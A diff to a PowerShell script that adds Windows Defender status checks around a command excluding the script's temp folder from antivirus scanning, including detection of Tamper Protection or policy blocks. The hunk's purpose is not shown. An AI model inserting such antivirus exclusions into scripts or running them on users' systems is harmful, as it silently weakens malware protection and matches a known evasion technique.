@@ -127,7 +127,35 @@ try	{
 	try { 
         # Проверка наличия модуля Windows Defender перед использованием
         if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
-            Add-MpPreference -ExclusionPath $temp -ErrorAction Stop
+            # Дополнительная диагностика состояния Windows Defender
+            try {
+                $defenderService = Get-Service WinDefend -ErrorAction SilentlyContinue
+                if ($defenderService -and $defenderService.Status -eq "Running") {
+                    $preferences = Get-MpPreference -ErrorAction SilentlyContinue
+                    if ($preferences) {
+                        if ($preferences.DisableRealtimeMonitoring -eq $true) {
+                            Write-Host "Windows Defender real-time protection is disabled" -ForegroundColor Yellow
+                        }
+                        # Проверяем Tamper Protection (косвенно)
+                        try {
+                            Add-MpPreference -ExclusionPath $temp -ErrorAction Stop
+                            Write-Host "Successfully added exclusion to Windows Defender: $temp" -ForegroundColor Green
+                        } catch {
+                            if ($_.Exception.Message -like "*0x800106ba*" -or $_.Exception.Message -like "*tamper*" -or $_.Exception.Message -like "*policy*") {
+                                Write-Host "Tamper Protection or Group Policy is blocking Windows Defender changes" -ForegroundColor Red
+                            } else {
+                                Write-Error "Error: Failed to add exclusion to Windows Defender. $($_.Exception.Message)"
+                            }
+                        }
+                    } else {
+                        Write-Host "Cannot get Windows Defender preferences - service may be disabled" -ForegroundColor Yellow
+                    }
+                } else {
+                    Write-Host "Windows Defender service is not running" -ForegroundColor Yellow
+                }
+            } catch {
+                Write-Error "Error: Failed to check Windows Defender status. $($_.Exception.Message)"
+            }
         } else {
             Write-Host "Windows Defender module not available - skipping exclusion" -ForegroundColor Yellow
         }
